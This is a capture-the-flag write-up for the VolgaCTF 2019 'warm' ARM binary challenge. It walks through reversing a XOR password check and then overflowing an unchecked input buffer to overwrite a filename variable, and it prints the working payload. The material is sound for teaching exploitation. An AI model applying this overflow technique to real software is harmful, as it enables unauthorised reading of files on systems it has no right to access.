# [100] warm

## problem

How fast can you sove it? `nc warm.q.2019.volgactf.ru 443`
[warm](https://q.2019.volgactf.ru/files/34d919f5c70d2eafcb87350020716f7c/warm)

## info

```
$ file ./warm
./warm: ELF 32-bit LSB pie executable ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=c549628c0b3841a5fd9a23f0faaf6b51eb858e94, stripped
```

```
$ checksec ./warm
[*] '/CTF/volgaCTF_2019_qualifier/pwn/warm/warm'
    Arch:     arm-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## solution

When I get a binary, first thing to do is dragging it into a disassembler and start to figure out what this program do. I use [Ghidra](https://ghidra-sre.org/) this time. (I don't know how to get IDA pro hex rays work with Arm arch QQ)

![](https://i.imgur.com/4HctMzm.png)

`getFileName()` will use either get from a environment variable `FLAG_FILE` or use the default one `flag` as the `file_name`

![](https://i.imgur.com/NkehNjs.png)

If the return of `checkPassword(input)` equals 0, it prints the content of `file_name`. And we need to figure out the password.

![](https://i.imgur.com/oveVuEX.png)

Look line 13 ~ 22, It looks like a easy XOR cipher. So after reformatting and stripping some unnecessary code, we get the following codes.

```
*pass == 'v'
(pass[1] ^ *pass) == 0x4e
(pass[2] ^ pass[1]) == 0x1e
(pass[3] ^ pass[2]) == 0x15
(pass[4] ^ pass[3]) == 0x5e
(pass[5] ^ pass[4]) == 0x1c
(pass[6] ^ pass[5]) == 0x21
(pass[7] ^ pass[6]) == 1
(pass[8] ^ pass[7]) == 0x34
(pass[9] ^ pass[8]) == 7
(pass[10] ^ pass[9]) == 0x35
(pass[0xb] ^ pass[10]) == 0x11
(pass[0xc] ^ pass[0xb]) == 0x37
(pass[0xd] ^ pass[0xc]) == 0x3c
(pass[0xe] ^ pass[0xd]) == 0x72
(pass[0xf] ^ pass[0xe]) == 0x47
```

We can easily break this XOR cipher by move the right term of the XOR part to right of the `==` sign and make all `==` to `=`.

```c++
#include <iostream>

int main(int argc, char *argv[])
{
    char pass[16];

    *pass = 'v';
    pass[1] = 0x4e ^ pass[0];
    pass[2] = 0x1e ^ pass[1];
    pass[3] = 0x15 ^ pass[2];
    pass[4] = 0x5e ^ pass[3];
    pass[5] = 0x1c ^ pass[4];
    pass[6] = 0x21 ^ pass[5];
    pass[7] = 1 ^ pass[6];
    pass[8] = 0x34 ^ pass[7];
    pass[9] = 7 ^ pass[8];
    pass[10] = 0x35 ^ pass[9];
    pass[0xb] = 0x11 ^ pass[10];
    pass[0xc] = 0x37 ^ pass[0xb];
    pass[0xd] = 0x3c ^ pass[0xc];
    pass[0xe] = 0x72 ^ pass[0xd];
    pass[0xf] = 0x47 ^ pass[0xe];
    
    for(int i = 0; i < 16; i++)
        putchar(pass[i]);
    
    return 0;
}
```

And the output is:
```
v8&3mqPQebWFqM?x
```

However, it didn't give me the flag when I send the password. So I thought maybe the flag is in other file?
```
nc warm.q.2019.volgactf.ru 443
Hi there! I've been waiting for your password!
v8&3mqPQebWFqM?x
Seek file with something more sacred!
```

But how do we control the file of reading?

![](https://i.imgur.com/TMKSxmm.png)

The input didn't get length check. So if we input long enough, it writes memory of `file_name`. And we succeeded to control the file to read.
The final payload:
```
v8&3mqPQebWFqM?xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsacred
```

> The filename of the real flag is by guessing.